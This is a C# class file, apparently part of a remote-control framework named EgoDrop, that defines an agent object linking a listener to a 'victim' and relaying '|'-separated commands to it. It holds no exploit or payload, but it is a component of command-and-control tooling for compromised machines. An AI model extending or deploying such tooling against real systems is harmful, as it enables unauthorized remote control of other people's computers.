using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace EgoDrop
{
    public class clsAgent
    {
        public clsListener m_listener { get; init; } //Listener object.
        public clsVictim m_victim { get; init; } //Victim object.
        
        public string m_szVictimID { get; init; } //Victim's ID.
        public string m_szUriName { get; init; } //Victim URI name.
        public bool m_bUnixlike { get; init; } //Is Unix-like.

        public List<uint> m_lnPort = new List<uint>();

        /// <summary>
        /// Key: Command entry.
        /// Value: stCommandSpec.
        /// </summary>
        public Dictionary<string, List<clsPlugin.stCommandSpec>> m_dicCommandRegistry = new();

        /// <summary>
        /// Agent object constructor.
        /// </summary>
        /// <param name="listener">Listener object.</param>
        /// <param name="victim">Victim object.</param>
        /// <param name="szVictimID">Victim ID.</param>
        /// <param name="szUriName">URI name(Display name).</param>
        /// <param name="bUnixlike">Is Unix-like.</param>
        public clsAgent(clsListener listener, clsVictim victim, string szVictimID, string szUriName, bool bUnixlike)
        {
            m_listener = listener;
            m_victim = victim;
            m_szVictimID = szVictimID;
            m_szUriName = szUriName;
            m_bUnixlike = bUnixlike;
        }

        /// <summary>
        /// Send command to agent.
        /// </summary>
        /// <param name="szMsg">Command.</param>
        public void fnSendCommand(string szMsg) => fnSendCommand(szMsg.Split('|'));

        /// <summary>
        /// Send command to agent.
        /// </summary>
        /// <param name="asMsg">Commands.</param>
        public void fnSendCommand(string[] asMsg) => fnSendCommand(asMsg.ToList());

        /// <summary>
        /// Send command to agent.
        /// </summary>
        /// <param name="lsMsg">Commands.</param>
        public void fnSendCommand(List<string> lsMsg)
        {
            m_victim.fnSendCommand(m_szVictimID, lsMsg);
        }
    }
}
